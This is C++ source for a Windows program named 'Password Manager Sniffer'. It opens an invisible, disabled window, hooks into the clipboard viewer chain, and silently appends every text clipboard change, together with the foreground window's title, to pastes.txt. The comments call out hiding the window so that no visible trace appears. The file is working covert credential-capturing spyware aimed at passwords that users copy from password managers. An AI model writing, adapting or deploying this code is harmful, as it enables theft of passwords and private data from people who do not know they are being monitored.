#include "stdafx.h"
#include "Password Manager Sniffer.h"

#define MAX_LOADSTRING 100

HINSTANCE hInst;
TCHAR szTitle[MAX_LOADSTRING];
TCHAR szWindowClass[MAX_LOADSTRING];

ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	MSG msg;
	HACCEL hAccelTable;

	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_PASSWORDMANAGERSNIFFER, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PASSWORDMANAGERSNIFFER));

	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground	= NULL;
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= NULL;

	return RegisterClassEx(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance;

   //Start the Window disabled, not visible
   hWnd = CreateWindow(szWindowClass, szTitle, WS_DISABLED, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   //Don't run ShowWindow to avoid creating a visable Window, but still get WndProc messages
   UpdateWindow(hWnd);

   return TRUE;
}

HWND hwndNextViewer;
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);		
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		//Add this to take this application out of the chain for clipboard monitors
		ChangeClipboardChain(hWnd, hwndNextViewer);
		PostQuitMessage(0);
		break;
	case WM_CREATE:
		//Add ourselves to the chain of clipboard monitors and store the next in the chain
		hwndNextViewer = SetClipboardViewer(hWnd); 
		break;
	case WM_CHANGECBCHAIN: 
		//Handle the changes to the chain
		if ((HWND) wParam == hwndNextViewer) 
			hwndNextViewer = (HWND) lParam; 
		else if (hwndNextViewer != NULL) 
			SendMessage(hwndNextViewer, message, wParam, lParam); 
		break;
	case WM_DRAWCLIPBOARD:
	case WM_CLIPBOARDUPDATE:	
		//Here is the message for changes to the clipboard
		//Make sure we can open the clipboard by doing so(blocking others from opening it)
		if(OpenClipboard(hWnd))
		{
			//Gets the global memory pointer for the data in the clipboard
			HGLOBAL hglb = GetClipboardData(CF_TEXT); 
			if (hglb != NULL) 
			{ 
				//Lock the global memory to get the string in the clipboard
				LPTSTR lptstr = (LPTSTR)GlobalLock(hglb); 
				if (lptstr != NULL) 
				{ 
					//Open the output file
					FILE * f = fopen("pastes.txt", "a");
					if(f != NULL)
					{
						char title[2048];
						memset(title, 0x00, 2048);
						//Get the currently active window which is most
						//likely the Window being copied from
						HWND copyFrom = GetForegroundWindow();
						//Get the title from that Window
						GetWindowText(copyFrom, title, 2048);
						//Then write it file
						fputs("(", f);
						if(title != NULL && strlen(title) != 0)
						{
							fputs(title, f);
						}
						fputs("):", f);

						//Then write the clipboard data to the file
						fputs(lptstr, f);

						//Then a newline to make it easier to read
						fputs("\n", f);
						fclose(f);
					}
					//Unlock the memory
					GlobalUnlock(hglb); 
				} 
			}
			//Close the clipboard
			CloseClipboard();
		}
		//Pass the message on to the next in the chain
        SendMessage(hwndNextViewer, message, wParam, lParam); 
        break; 
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}
